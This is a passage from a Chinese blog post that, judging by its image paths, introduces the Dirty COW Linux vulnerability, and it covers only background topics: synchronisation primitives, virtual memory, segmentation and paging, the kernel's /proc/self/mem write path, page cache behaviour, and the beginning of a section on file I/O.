<li><strong>条件变量是用来等待而不是用来上锁的。条件变量用来自动阻塞一个线程，直到某特殊情况发生为止。通常条件变量和互斥锁同时使用。</strong></li>
</ul>
</li>
<li>临界区对象，CRITICAL_SECTION</li>
<li>信号量（semaphore），控制可访问某个临界区的线程数量，一般比 1 大。</li>
<li>管道，指用于连接一个读进程和一个写进程以实现它们之间通信的一个共享文件。其生存期不超过创建管道的进程的生存期。</li>
<li>命名管道，生存期可以与操作系统运行期一样长。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建管道</span></span><br><span class="line">mkfifo my_pipe</span><br><span class="line"><span class="comment"># gzip从给定的管道中读取数据，并把数据压缩到out.gz中</span></span><br><span class="line">gzip -9 -c &lt; my_pipe &gt; out.gz &amp;</span><br><span class="line"><span class="comment"># 给管道传输数据</span></span><br><span class="line">cat file &gt; my_pipe</span><br></pre></td></tr></table></figure>

<p>仍要注意同步原语可能造成死锁的问题。</p>
<h3 id="三、虚拟内存"><a href="#三、虚拟内存" class="headerlink" title="三、虚拟内存"></a>三、虚拟内存</h3><p>由于物理内存是有限的，且直接通过操作物理内存并不是特别方便，在编写大型程序时尤为明显，所以目前操作系统都采用虚拟内存的技术。</p>
<p>虚拟内存技术可以使多个<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%A1%8C%E7%A8%8B" >进程<i class="fas fa-external-link-alt"></i></a>共享同一个<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB" >运行库<i class="fas fa-external-link-alt"></i></a>，并通过分割不同进程的内存空间来提高系统的安全性。进程自己的视角来看的内存是独立的，每个进程都可以全部的4G内存空间（32位下）。</p>
<p>而且进程的虚拟内存空间会被分成不同的若干区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在linux内核中，这样的区域被称之为虚拟内存区域(virtual memory areas，简称 VMA）。可以通过虚拟文件系统中的/proc/self/maps 即可查看当前进程的VMA，或者通过gdb的vmmap命令：</p>
<blockquote>
<p>下面这个就是VMA</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start      End        Perm	Name</span><br><span class="line">0x08048000 0x080eb000 r-xp	/mnt/hgfs/桌面/pwnable/calc/calc</span><br><span class="line">0x080eb000 0x080ed000 rw-p	/mnt/hgfs/桌面/pwnable/calc/calc</span><br><span class="line">0x080ed000 0x08111000 rw-p	[heap]</span><br><span class="line">0xf7ff9000 0xf7ffc000 r--p	[vvar]</span><br><span class="line">0xf7ffc000 0xf7ffe000 r-xp	[vdso]</span><br><span class="line">0xfffdd000 0xffffe000 rw-p	[stack]</span><br></pre></td></tr></table></figure>

<p>在这个机制下，每个进程都有了自己的虚拟地址空间，但是最终还是要真正的存储在物理的内存上，所以虚拟空间中的地址一定与物理内存有一定的对应关系。在x86架构上，硬件有两种机制支持这种映射，即段式内存访问和页式内存访问，两种几乎为竞争关系。发展到现在，结果毋庸置疑，页式完胜。到了x64，段式内存访问就基本退出了历史舞台了。但是段寄存器仍然肩负着特权级保护的作用。所以这里我们主要介绍页式内存管理。</p>
<h4 id="1、段寄存器"><a href="#1、段寄存器" class="headerlink" title="1、段寄存器"></a>1、段寄存器</h4><h5 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h5><p>主要参考了[7]与[8]，段寄存器实际上是一种历史技术，在现在（x64系统）的应用场景中显得有些多余，但对历史解决寻址问题做出了比较大的贡献。</p>
<h5 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h5><p>段寄存器的产生源于Intel 8086 CPU体系结构中数据总线与地址总线的宽度不一致。</p>
<h5 id="16位CPU"><a href="#16位CPU" class="headerlink" title="16位CPU"></a>16位CPU</h5><p>8086处理器位数为16位，但是地址总线却为20根。为了能够访问到整个地址空间，在CPU里添加了4个段寄存器，分别为CS（代码段寄存器）DS（数据段寄存器） SS（堆栈段寄存器）ES(扩展数据段寄存器)。所以段寄存器就是为了解决CPU位数和地址总线不同的问题而诞生的。</p>
<p>Intel通过段寄存器寻址的方法是：通过4个段寄存器，CS，DS，ES和SS，把内存分为很多段，每一段有一个段基址，当然段基址也是一个20位的内存地址。不过段寄存器仍然是16位的，它的内容代表了段基址的高16位，这个16位的地址后面再加上4个0就构成20位的段基址。而原来的16位地址只是段内的偏移量。这样，一个完整的物理内存地址就由两部分组成，高16位的段基址和低16位的段内偏移量，当然它们有12位是重叠的，它们两部分相加在一起，才构成完整的物理地址。</p>
<p>Base            b15 ~ b12    b11 ~ b0     </p>
<p>Offset         o15 ~ o4    o3 ~ o0</p>
<p>Address        a19 ~ a0</p>
<p>这种寻址模式也就是“实地址模式”。在8086中，段寄存器还只是一个单纯的16位寄存器，而且操作寄存器的指令也不是特权指令。通过设置段寄存器和段内偏移，程序就可以访问整个物理内存，无安全性可言。</p>
<p>总之一句话，段寄存器的设计是一个权宜之计，现在看来可以说是一个临时性的解决方案，设计它的目的是为了把地址空间从64KB扩展为1MB，仅此而已。但是它的加入却为日后Intel系列芯片的发展带来诸多不便，也为理解i386体系带来困扰。</p>
<h5 id="32位CPU"><a href="#32位CPU" class="headerlink" title="32位CPU"></a>32位CPU</h5><p>到了我们处理器80386时候（保护模式），这时候cpu是32位，地址总线变成了32根，这时的寻址能力已经足够用，已经不再需要段寄存器来帮助扩展。但这时Intel已经无法把段寄存器从产品中去掉，因为新的CPU也是产品系列中的一员，根据兼容性的需要，段寄存器必须保留下来。除了先前的4个段寄存器CS DS SS ES，还引入了两个新的段寄存器FS、GS（附加数据段寄存器）。为了兼容性开率，他们均是16比特位宽。</p>
<p>很明显16比特位宽并不能很好的描述32位CPU的地址。这个时候增加了两个寄存器，GDTR（全局的段的描述附表），LDTR（局部的描述附表），他们分别指向了GDT(Global Descriptor Table)和LDT(Local Descriptor Table)。段描述符存储在 GDT 或者 LDT 中。GDT 或者 LDT 结构中包含基地址、段长度等信息。<strong>段寄存器</strong>CS DS SS ES<strong>存放的是段描述符在GDT或LDT内的索引值</strong>(index)。GDT 或者 LDT 中的基地址加上指令中的偏移量就可以得到需要的线性地址。如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">线性地址 = [ 段描述符 ]+段内偏移量</span><br></pre></td></tr></table></figure>

<p>备注：由于每个进程都可以有 LDT，而 GDT 只有一个，为满足需求 Intel 的做法是将 LDT 嵌套在 GDT 表中。</p>
<p>可以看到，32位操作系统中仍是段页式内存管理并存。</p>
<h5 id="64位CPU"><a href="#64位CPU" class="headerlink" title="64位CPU"></a>64位CPU</h5><p>在64位模式下：处理器把CS/DS/ES/SS的段基都当作0，忽略与之关联的段描述符中的段基地址。因为在64位模式中，CPU可以访问所有可寻址的内存空间。今天大多数的64位CPU只需要访问40位到48位的物理内存，因此不再需要段寄存器去扩展。<strong>页式存管本身是与段式存管分立的，两者没有什么关系。但对于Intel来说，同样是由于“段寄存器”这个历史的原因，它必须把页式存管建立在段式存管的基础之上，尽管这从设计的角度来说这是没有道理，也根本没有必要的。</strong></p>
<h5 id="CPU寻址与地址转换总结"><a href="#CPU寻址与地址转换总结" class="headerlink" title="CPU寻址与地址转换总结"></a>CPU寻址与地址转换总结</h5><p>【1】首先在16位或者更早的Intel CPU上，CPU工作在实模式，即直接使用物理地址，没有OS虚拟地址的概念。因此，在这些平台上，进行访问的线性地址 = 物理地址：</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/v2-579718b4f504316a56d3e8695f1a161d_720w.jpg" alt="img"></p>
<p>【2】在IA32上，x86工作在保护模式下时，分段单元将逻辑地址转换成线性地址，分页单元（MMU开启情况下）将线性地址转换成物理地址。当CPU启用了MMU，CPU核发出的地址将被MMU截获，从CPU到MMU的地址称为虚拟地址（Virtual Address，以下简称VA），而MMU将这个地址翻译成另一个地址发到CPU芯片的外部地址引脚上，也就是将虚拟地址映射成物理地址：</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/v2-f5bd16f2f8dff63aabb873374f5517bd_720w.jpg" alt="img"></p>
<p>【3】在x86_64上，处理器把CS/DS/ES/SS的段基都当作0，实际上摒弃了段式管理，不再使用。指令中使用的地址就是线性地址，当CPU开启MMU时，通过页式管理单元翻译成物理地址：</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/v2-e12e6284571311db6e87857455f7fcf3_720w.jpg" alt="img"></p>
<p>做个表格来体现一下</p>
<table>
<thead>
<tr>
<th>CPU位数</th>
<th>16位</th>
<th>32位</th>
<th>64位</th>
</tr>
</thead>
<tbody><tr>
<td>内存管理方式</td>
<td>段式内存管理</td>
<td>段页式内存管理</td>
<td>页式内存管理</td>
</tr>
</tbody></table>
<h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p>问：为什么32位CPU对应了32位总线仍需要段寄存器参与呢？</p>
<p>答：为了兼容保护模式的需要，通过段寄存器可以对内存做更细粒度的权限控制</p>
<h4 id="2、页式内存管理"><a href="#2、页式内存管理" class="headerlink" title="2、页式内存管理"></a>2、页式内存管理</h4><p>页式内存管理中把虚拟内存和物理内存都划分为长度大小固定的页，把虚拟内存页和真实的物理内存页的对应关系存储成一张表，就是页表，可以把页表想象成存放在内存中的一个大数组。</p>
<p>这个页表是每个进程都有的一个大数组，操作系统将这个大数组的起始地址存储到页表基址寄存器。这样即可通过查询页表将进程虚拟空间中的逻辑地址转换为内存条上的物理地址。使能页机制后，不仅能使进程获得相对独立的虚拟内存空间，而且通过对页表的结构设计出相应的权限控制，更安全的管理内存。</p>
<p>实际上就是一种细粒度的虚拟内存管理方式，更加合理有效的提高了内存的利用率。根据局部性原理，我们只需要在内存中保存少部分的页，大部分的页都可以换到磁盘中去。</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/YssggO.png" alt="YssggO.png"></p>
<h4 id="3、缺页中断"><a href="#3、缺页中断" class="headerlink" title="3、缺页中断"></a>3、缺页中断</h4><p>由于物理内存是有限的，操作系统会给某个进程分配固定数量的页框供进程使用，所以进程用到的逻辑页面的个数肯定要比分配到的物理页框的个数要多，但因为程序的执行是有空间局部性和时间局部性，所以在时间维度上可以暂时将不需要的页面从物理页框中换出到磁盘上（<strong>注意：这里出现了外部存储设备！</strong>），但是在逻辑内存空间中，即进程自己看到的内存空间中，进程自己是感受不到的，进程自己觉得自己的4G内存空间用的非常好。当进程访问到一个逻辑页面时，操作系统去查页表，发现这个逻辑页面不在内存中，那么则会去磁盘上找到刚才换出的页面，重新加载到内存，然后修好页表，然后重新去用逻辑地址查找这个物理地址，这个过程就是缺页中断。</p>
<p>简单来说就是缺页时将页从磁盘恢复到主存的过程。</p>
<p>不过这只是缺页中断的一种情况，在liunx的内存管理中，可能还会有其他情况也会出现缺页中断，例如首次访问某个逻辑地址时，或者需要触发写时复制时等等。</p>
<h4 id="4、-proc-self-mem"><a href="#4、-proc-self-mem" class="headerlink" title="4、/proc/self/mem"></a>4、/proc/self/mem</h4><p>整体总结：/proc/self/mem是当前进程的内存映射，对/proc/self/mem写可以对用户空间中的只读内存进行写入。可以写入只读内存基于的理念为<strong>内存权限的概念纯粹是对虚拟内存的约束，和物理内存无关</strong>。对/proc/self/mem写入的过程首先绕过MMU通过通过软件页表遍历将虚拟地址转换为物理地址，且遵循写时复制（COW）的概念，之后将物理地址映射到内核的可写内存中，之后对这块可写内存进行memcpy写入。</p>
<p>详细过程参考<a class="link"   target="_blank" rel="noopener" href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/" >该文章<i class="fas fa-external-link-alt"></i></a>。</p>
<h5 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h5><p>proc文件系统是一个伪文件系统，它为内核数据结构提供接口。它通常安装在/proc。通常，它是由系统自动挂载的，但也可以使用如下命令手动挂载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc proc /proc </span><br></pre></td></tr></table></figure>

<p>proc文件系统中的大部分文件是只读的，但有些文件是可写的，允许要更改的内核变量。</p>
<h5 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a>/proc/self</h5><p>当进程访问这个神奇的符号链接时，它解析到进程自己的/proc/[pid]目录。</p>
<h5 id="proc-pid-mem"><a href="#proc-pid-mem" class="headerlink" title="/proc/[pid]/mem"></a>/proc/[pid]/mem</h5><p>该文件可通过open(2)，read(2)和lseek(2)用于访问进程的页面内存。访问此文件的权限由 ptrace 管理访问模式PTRACE_MODE_ATTACH_FSSCREDS检查；见ptrace(2)。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_MODE_ATTACH_FSCREDS</span><br><span class="line">              Defined as PTRACE_MODE_ATTACH | PTRACE_MODE_FSCREDS.</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">PTRACE_MODE_ATTACH</span><br><span class="line">              For <span class="string">&quot;write&quot;</span> operations, <span class="keyword">or</span> other operations that are more</span><br><span class="line">              dangerous, such as: <span class="function">ptrace <span class="title">attaching</span> <span class="params">(PTRACE_ATTACH)</span> to</span></span><br><span class="line"><span class="function">              another process <span class="keyword">or</span> calling <span class="title">process_vm_writev</span><span class="params">(<span class="number">2</span>)</span>.</span></span><br><span class="line"><span class="function">              <span class="params">(PTRACE_MODE_ATTACH was effectively the <span class="keyword">default</span> before</span></span></span><br><span class="line"><span class="params"><span class="function">              Linux <span class="number">2.6</span><span class="number">.27</span>.)</span></span></span><br><span class="line"><span class="function">                  </span></span><br><span class="line"><span class="function">PTRACE_MODE_FSCREDS</span></span><br><span class="line"><span class="function">              Use the caller&#x27;s filesystem UID <span class="keyword">and</span> <span class="title">GID</span> <span class="params">(see</span></span></span><br><span class="line"><span class="params"><span class="function">              credentials(<span class="number">7</span>))</span> <span class="keyword">or</span> effective capabilities <span class="keyword">for</span> LSM checks.</span></span><br></pre></td></tr></table></figure>

<p>该文件是一个指向当前进程的虚拟内存文件的文件，当前进程可以通过对这个文件进行读写以直接读写虚拟内存空间，并无视内存映射时的权限设置。也就是说我们可以利用写/proc/self/mem来改写不具有写权限的虚拟内存。可以这么做的原因是/proc/self/mem是一个文件，只要进程对该文件具有写权限，那就可以随便写这个文件了，只不过对这个文件进行读写的时候需要一遍访问内存地址所需要寻页的流程。因为这个文件指向的是虚拟内存。</p>
<p>我对上面的/proc/self/mem的无视权限进行写入的表达是存疑的，这使得我又去网络上找到了相关的资料，参考<a class="link"   target="_blank" rel="noopener" href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/" >[14]<i class="fas fa-external-link-alt"></i></a>。那么为什么可以这么做呢？首先了解一下限制内核访问内存的措施。</p>
<h6 id="限制内核访问内存的措施"><a href="#限制内核访问内存的措施" class="headerlink" title="限制内核访问内存的措施"></a>限制内核访问内存的措施</h6><p>首先在 x86-64 上有两个 CPU 选项控制内核访问内存的能力。且它们由内存管理单元 (MMU) 强制执行。</p>
<p>第一个设置是写保护位 (CR0.WP)。来自英特尔手册第 3 卷第 2.5 节：</p>
<blockquote>
<p><em>Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level procedures from writing into read- only pages; when clear, allows supervisor-level procedures to write into read-only pages (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6).</em></p>
</blockquote>
<p>大意是当该位置为1时将禁止管理员程序写入只读界面；当置为0时则允许管理员程序对制度页面的写入。</p>
<p>第二个设置是限制内核对用户内存的访问 (SMAP) (CR4.SMAP)。在英特尔手册第 3 卷第 4.6 节中的完整描述是很冗长的，但执行摘要的描述表示SMAP 完全禁用了内核读取或写入用户空间内存的能力。这为在用户空间中填充恶意数据使内核在利用期间读取的安全漏洞利用带来阻碍。</p>
<p>如果有问题的内核代码仅使用经过批准的通道来访问用户空间（copy_to_user 等），则可以忽略 SMAP——这些函数会在访问内存之前和之后自动切换 SMAP。但是如何绕过写保护？</p>
<p>清除 CR0.WP 后，/proc/*/mem 的内核实现确实能够直接地写入不可写的用户空间内存。</p>
<p>但是，CR0.WP<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.12/source/arch/x86/kernel/head_64.S#L240" >默认为1<i class="fas fa-external-link-alt"></i></a>，并且通常在系统的生命周期内保持设置。在这种情况下，将触发页面错误以响应写入。作为一种促进写时复制的工具而不是安全边界，这对内核没有任何真正的限制。也就是说，它确实需要故障处理的不便，否则这是不必要的。</p>
<p>考虑到这一点，让我们查看一下实现。</p>
<h6 id="绕过写保护位-CR0-WP"><a href="#绕过写保护位-CR0-WP" class="headerlink" title="绕过写保护位 (CR0.WP)"></a>绕过写保护位 (CR0.WP)</h6><p>CR0.WP通过MMU进行检查，那我们直接绕过MMU即可，MMU用于虚拟内存“翻译”为物理内存。那么内核自己实现这样一套过程就可以绕过这个限制。</p>
<ol>
<li>调用 get_user_pages_remote() 查找目标虚拟地址对应的物理帧。</li>
<li>调用 kmap() 将该帧映射到内核的可写虚拟地址空间。</li>
<li>调用 copy_to_user_page() 以最终执行写入。</li>
</ol>
<p>首先**get_user_pages_remote()**：该函数最关键的功能就是将虚拟地址转化为物理地址，而这正是 get_user_pages() 系列函数所提供的。这些函数通过遍历页表来查找支持给定虚拟地址范围的物理内存帧。他们还处理访问验证和不存在的页面。其中FOLL_FORCE标志尤其重要。当其置为，则内核函数忽略不可写页面的写入并继续查找。</p>
<p>之后**kmap()**函数将物理帧映射到内核的虚拟地址空间中，并具有可写权限，在 64 位 x86 上，所有物理内存都通过内核虚拟地址空间的线性映射区域进行映射。在这种情况下，kmap() 是微不足道的——它只需要将线性映射的起始地址添加到帧的物理地址即可计算帧映射到的虚拟地址。而在 32 位 x86 上，线性映射包含物理内存的子集，因此 kmap() 可能需要通过分配 highmem 内存和操作页表来映射帧。在这两种情况下，<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.9-rc3/source/arch/x86/mm/init.c#L559" >线性映射<i class="fas fa-external-link-alt"></i></a>和<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.9-rc3/source/include/linux/highmem.h#L44" >highmem<i class="fas fa-external-link-alt"></i></a>映射都分配有<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.9-rc3/source/arch/x86/include/asm/pgtable_types.h#L190" >PAGE_KERNEL<i class="fas fa-external-link-alt"></i></a>保护，即 RW。</p>
<p>最后**copy_to_user_page()**执行写入。本质上是一个memcpy</p>
<h6 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h6><p>这个实现的有趣之处在于它不涉及 CR0.WP。<strong>该实现通过利用它没必要通过从用户空间接收的指针访问内存这一事实巧妙地回避了内存权限的限制</strong>。由于内核完全控制着虚拟内存，它可以简单地将物理帧重新映射到自己的虚拟地址空间中，具有任意权限，并按照自己的意愿对其进行操作。</p>
<p>这很重要：<strong>保护内存页面的权限与用于访问该页面的虚拟地址相关联，而不是与支持该页面的物理框架相关联</strong>。实际上，内存权限的概念纯粹是对虚拟内存的考虑，与物理内存无关。</p>
<h3 id="四、linux-I-O"><a href="#四、linux-I-O" class="headerlink" title="四、linux I/O"></a>四、linux I/O</h3><h4 id="1、page-cache"><a href="#1、page-cache" class="headerlink" title="1、page cache"></a>1、page cache</h4><p>考虑到这样一个场景，在现有的linux环境下，当我们使用write/read进行读写文件时，我们操作的是磁盘文件吗？</p>
<p>带着这个疑问，我们思考一下，当涉及到文件操作时，操作系统必须解决两个严重的问题：</p>
<ol>
<li>当操作系统读做数据的访问操作时，对磁盘的访问速度远小于内存，文件越大，效果越明显。</li>
<li>当多个进程均访问同一个磁盘文件的内容时，由于进程数据隔离，不可能将文件内容在所有进程都拷贝一份。如果您使用 <a class="link"   target="_blank" rel="noopener" href="http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx" >Process Explorer<i class="fas fa-external-link-alt"></i></a>查看 Windows 进程，您会看到每个进程中加载了大约 15MB 的常用 DLL。我的 Windows 机器现在正在运行 100 个进程，因此如果不共享，我将使用高达 ~1.5 GB 的物理 RAM<em>来处理常见的 DLL</em>。</li>
</ol>
<p>基于上面的观点，对内存的访问相较于对磁盘的访问来说更高效。</p>
<p>但是内存是有限的，我们不可能将磁盘上所有的内容都放入内存中，这时就需要对放入内存中的磁盘文件进行筛选。这时Page cache应运而生。</p>
<p>在计算机，page cache，有时也称为disk cache，它是一种透明缓存，用于存储源自二级存储设备（如硬盘驱动器(HDD) 或固态驱动器(SSD)）的页面。操作系统在主内存(RAM)的其他未使用部分中保留页面缓存，从而更快地访问缓存页面的内容并提高整体性能。页面缓存在内核中通过分页内存管理实现，并且对应用程序几乎是透明的。</p>
<p>由于硬盘和内存的读写性能差距巨大，Linux默认情况是以异步方式读写文件的。比如调用系统函数open()打开或者创建文件时缺省情况下是带有O_ASYNC flag的。Linux借助于内核的page cache来实现这种异步操作。引用《Understanding the Linux Kernel, 3rd Edition》中关于<code>page cache</code>的定义：</p>
<blockquote>
<p>The page cache is the main disk cache used by the Linux kernel. In most cases, the kernel refers to the page cache when reading from or writing to disk. New pages are added to the page cache to satisfy User Mode processes’s read requests. If the page is not already in the cache, a new entry is added to the cache and filled with the data read from the disk. If there is enough free memory, the page is kept in the cache for an indefinite period of time and can then be reused by other processes without accessing the disk.<br>Similarly, before writing a page of data to a block device, the kernel verifies whether the corresponding page is already included in the cache; if not, a new entry is added to the cache and filled with the data to be written on disk. The I/O data transfer does not start immediately: the disk update is delayed for a few seconds, thus giving a chance to the processes to further modify the data to be written (in other words, the kernel implements deferred write operations).</p>
</blockquote>
<p>也就是说，我们平常向硬盘写文件时，默认异步情况下，并不是直接把文件内容写入到硬盘中才返回的，而是成功拷贝到内核的page cache后就直接返回，所以大多数情况下，硬盘写操作不会是性能瓶颈。写入到内核page cache的pages成为dirty pages，稍后会由内核线程pdflush真正写入到硬盘上。</p>
<p>从硬盘读取文件时，同样不是直接把硬盘上文件内容读取到用户态内存，而是先拷贝到内核的page cache，然后再“拷贝”到用户态内存，这样用户就可以访问该文件。因为涉及到硬盘操作，所以第一次读取一个文件时，不会有性能提升；不过，如果一个文件已经存在page cache中，再次读取该文件时就可以直接从page cache中命中读取不涉及硬盘操作，这时性能就会有很大提高。</p>
<p>下面用<code>dd</code>比较下异步（缺省模式）和同步写硬盘的速度差别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=/dev/urandom of=async.txt bs=64M count=16 iflag=fullblock</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 7.618 s, 141 MB/s</span><br><span class="line">$ dd if=/dev/urandom of=sync.txt bs=64M count=16 iflag=fullblock oflag=sync</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 13.2175 s, 81.2 MB/s</span><br></pre></td></tr></table></figure>

<p>page cache除了可以提升和硬盘交互性能外，下面继续讨论page cache功能。</p>
<h5 id="（1）如果程序crash，异步模式会丢失数据吗？"><a href="#（1）如果程序crash，异步模式会丢失数据吗？" class="headerlink" title="（1）如果程序crash，异步模式会丢失数据吗？"></a>（1）如果程序crash，异步模式会丢失数据吗？</h5><p>比如存在这样的场景：一批数据已经成功写入到page cache，这时程序突然crash，但是在page cache里的数据还没来得及被pdflush写回到硬盘，这批数据会丢失吗？<br>答案是，要看具体情况：</p>
<ol>
<li>如果OS没有crash或者重启的话，仅仅是写数据的程序crash，那么已经成功写入到page cache中的dirty pages是会被pdflush在合适的时机被写回到硬盘，不会丢失数据；</li>
<li>如果OS也crash或者重启的话，因为page cache存放在内存中，一旦断电就丢失了，那么就会丢失数据。<br>至于这种情况下，会丢失多少数据，主要看系统重启前有多少dirty pages被写入到硬盘，已经成功写回硬盘的就不会丢失；没来得急写回硬盘的数据就彻底丢失了。这也是异步写硬盘的一个潜在风险。<br>同步写硬盘时就不存在这种丢数据的风险。同步写操作返回成功时，能保证数据一定被保存在硬盘上了。</li>
</ol>
<p>引用RocksDB wiki中关于“<a class="link"   target="_blank" rel="noopener" href="https://github.com/facebook/rocksdb/wiki/Basic-Operations#asynchronous-writes" >Asynchronous Writes<i class="fas fa-external-link-alt"></i></a>”描述：</p>
<blockquote>
<p>Asynchronous writes are often more than a thousand times as fast as synchronous writes. The downside of asynchronous writes is that a crash of the machine may cause the last few updates to be lost. Note that a crash of just the writing process (i.e., not a reboot) will not cause any loss since even when sync is false, an update is pushed from the process memory into the operating system before it is considered done.</p>
</blockquote>
<p>那么如何避免因为系统重启或者机器突然断电，导致数据丢失问题呢？<br>可以借助于WAL（Write-Ahead Log）技术。</p>
<p>WAL技术在数据库系统中比较常见，在数据库中一般又称之为redo log，Linux 文件系统ext3/ext4称之为journaling。WAL作用是：写数据库或者文件系统前，先把相关的metadata和文件内容写入到WAL日志中，然后才真正写数据库或者文件系统。WAL日志是append模式，所以，对WAL日志的操作要比对数据库或者文件系统的操作轻量级得多。如果对WAL日志采用同步写模式，那么WAL日志写成功，即使写数据库或者文件系统失败，可以用WAL日志来恢复数据库或者文件系统里的文件。</p>
<h5 id="（2）查看一个文件占用page-cache情况"><a href="#（2）查看一个文件占用page-cache情况" class="headerlink" title="（2）查看一个文件占用page cache情况"></a>（2）查看一个文件占用page cache情况</h5><p>可以借助于<a class="link"   target="_blank" rel="noopener" href="https://hoytech.com/vmtouch/" >vmtouch<i class="fas fa-external-link-alt"></i></a>工具：</p>
<blockquote>
<p>vmtouch is a tool for learning about and controlling the file system cache of unix and unix-like systems.</p>
</blockquote>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329165324080.png" alt="image-20220329165324080"></p>
<h5 id="（3）一些注意点"><a href="#（3）一些注意点" class="headerlink" title="（3）一些注意点"></a>（3）一些注意点</h5><p>由于缓存页面可以很容易地被驱逐和重用，一些操作系统，特别是<a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_NT" >Windows NT<i class="fas fa-external-link-alt"></i></a>，甚至将页面缓存使用情况报告为“可用”内存，而内存实际上是分配给磁盘页面的。这导致了一些关于在 Windows 中使用页面缓存的混乱。</p>
<p>cache也容易产生测信道攻击，由于page cache与磁盘文件有pdflush措施，一般磁盘文件都有着严格的权限分离措施，所以page cache可能存在某些文件页面可以绕过权限分离并泄露有关其他进程的数据。这里的内容比较多，就不展开了。</p>
<h4 id="2、mmap"><a href="#2、mmap" class="headerlink" title="2、mmap"></a>2、mmap</h4><p>这里可以简单提一下linux I/O相关。</p>
<h5 id="（1）传统的文件传输"><a href="#（1）传统的文件传输" class="headerlink" title="（1）传统的文件传输"></a>（1）传统的文件传输</h5><p>如果服务端要提供文件传输的功能，我们能想到的最简单的方式是：将磁盘上的文件读取出来，然后通过网络协议发送给客户端。</p>
<p>传统 I/O 的工作方式是，数据读取和写入是从用户空间到内核空间来回复制，而内核空间的数据是通过操作系统层面的 I/O 接口从磁盘读取或写入。</p>
<p>代码通常如下，一般会需要两个系统调用：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(file, tmp_buf, len);</span><br><span class="line"><span class="built_in">write</span>(socket, tmp_buf, len);</span><br></pre></td></tr></table></figure>

<p>代码很简单，虽然就两行代码，但是这里面发生了不少的事情。</p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BC%A0%E7%BB%9F%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.png" alt="传统文件传输"></p>
